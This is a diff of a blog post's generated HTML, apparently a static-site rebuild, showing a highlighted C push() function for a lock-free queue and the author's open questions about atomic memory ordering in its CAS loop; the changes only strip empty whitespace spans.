-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
 
-<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="cm">/* Ensure the head is read before tail */</span><span class="w"></span>
-<span class="w">        </span><span class="n">__atomic_thread_fence</span><span class="p">(</span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* Ensure the head is read before tail */</span>
+<span class="w">        </span><span class="n">__atomic_thread_fence</span><span class="p">(</span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span>
 
-<span class="w">        </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span>
 
-<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span>
 
-<span class="w">        </span><span class="cm">/* rest of the CAS loop */</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="cm">/* rest of the CAS loop */</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span>
 <span class="w">    </span><span class="c1">// ...</span>
 </code></pre></div>
 
 <p>The <em>thread fence</em> synchronize with the atomic ensuring that the head stored by one producer is visible by the load of another.</p>
 <p>Is it possible for a producer to load a head <em>too</em> old? By the moment of the load another producer had already stored a new value but it is still not visible by the former.</p>
-<p>If that is possible the former producer will compute an incorrect <code><span class="highlight-candombe-inline"><span class="n">free_entries</span><span class="w"></span></span></code>.</p>
+<p>If that is possible the former producer will compute an incorrect <code><span class="highlight-candombe-inline"><span class="n">free_entries</span></span></code>.</p>
 <p>What about the CAS instruction? If the producer didn’t see the updated value by the time it does the CAS instruction, it will be setting the <em>wrong</em> head value just as if the CAS loop wasn’t there.</p>
 <p>Am I missing something? – Probably.</p>
 <h2 id="references">References</h2>
